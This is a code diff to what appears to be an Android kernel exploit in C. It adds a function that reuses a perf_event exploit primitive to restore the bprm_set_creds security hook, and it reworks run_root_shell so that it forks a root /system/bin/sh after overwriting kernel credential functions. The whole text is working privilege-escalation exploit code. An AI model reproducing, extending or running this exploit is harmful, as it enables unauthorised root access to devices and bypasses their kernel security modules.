@@ -405,6 +405,12 @@ run_exploit(int offset)
 }
 
 static bool
+restore_lsm(int offset)
+{
+  return perf_event_run_exploit_with_offset(offset, (int)&restore_bprm_set_creds, call_ptmx_fsync, NULL);
+}
+
+static bool
 setup_cred_functions(int offset)
 {
   void *kernel;
@@ -429,6 +435,8 @@ setup_cred_functions(int offset)
 static int
 run_root_shell(int offset)
 {
+  int status;
+
   if (!setup_cred_functions(offset)) {
     return -EFAULT;
   }
@@ -436,7 +444,18 @@ run_root_shell(int offset)
   printf("run root shell\n");
   run_exploit(offset);
 
-  return execl("/system/bin/sh", "/system/bin/sh", NULL);
+  pid_t pid;
+
+  pid = fork();
+  if (pid == -1) {
+    return -1;
+  } else if (pid == 0) {
+    execl("/system/bin/sh", "/system/bin/sh", NULL);
+  } else {
+    wait(&status);
+  }
+
+  return status;
 }
 
 int
@@ -453,6 +472,7 @@ main(int argc, char **argv)
       dump_kernel_image(offset, argc, argv);
     } else {
       run_root_shell(offset);
+      exit(EXIT_SUCCESS);
     }
     exit(EXIT_SUCCESS);
   }
